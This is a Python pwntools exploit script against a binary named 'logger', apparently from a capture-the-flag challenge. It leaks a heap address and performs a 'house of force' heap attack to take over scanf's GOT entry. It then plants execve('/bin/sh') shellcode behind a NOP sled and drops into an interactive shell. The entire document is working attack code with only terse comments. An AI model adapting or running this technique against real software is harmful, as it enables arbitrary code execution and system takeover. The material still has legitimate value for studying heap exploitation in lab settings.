from pwn import *
import re, ctypes

name = 'lowkey123-'
password = '/bin/sh'
elf = ELF('./logger')
scanf_got = elf.got['__isoc99_scanf']

def login(s):
	s.recvuntil("1. Login\n2. exit\n")
	s.sendline('1')
	s.recvuntil("Name    :")
	s.sendline(name)
	s.recvuntil("Password:")
	s.sendline(password)

def write_file(s, content):
	s.sendline('2')
	s.sendline(str(len(content)))
	if len(content) == 128:
		s.send(content)
	else:
		s.sendline(content)
	s.clean(0.3)

def write_file_size(s, content, length):
	s.sendline('2')
	s.sendline(str(length))
	if length >= 0:
		s.sendline(content)
	s.clean(0.3)


context.log_level = 'debug'
r = process('./logger')
login(r)
write_file(r, 'A' * 32)
r.sendline('4')
r.close()

r = process('./logger')
login(r)
r.sendline('1')
print r.clean()
r.sendline('3')

r.recvuntil('filename: ')
chunk_leaked = u64(r.recvuntil('====')[32:-4].ljust(8, '\x00'))
log.info('chunk_leaked :' + hex(chunk_leaked))
new_top_chunk = chunk_leaked + 0x78 #where 0xffffffffffffffff located
log.info('new_top_chunk :' + hex(new_top_chunk))

write_file(r, "00000000")
ro = process('./logger')
login(ro)

malloc_size = scanf_got - new_top_chunk - 0x40 #malloc another 0x40(the file size) chunk in 0x40126c
malloc_size -= 0x10 #sub the chunk header
log.info('malloc_size :' + hex(malloc_size))
write_file(ro, p64((1 << 64) - 1)) #overwrite the top_chunk size to the max(house of force)
pause()
r.sendline('1')

ro.sendline('4')
ro.close()
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
write_file_size(r, '', malloc_size)
write_file(r, p64(0x602110)* 4 + shellcode.rjust( 8 * 12, '\x90')) #edit scanf to the 0x602110(where whe shellcode located)
r.interactive()


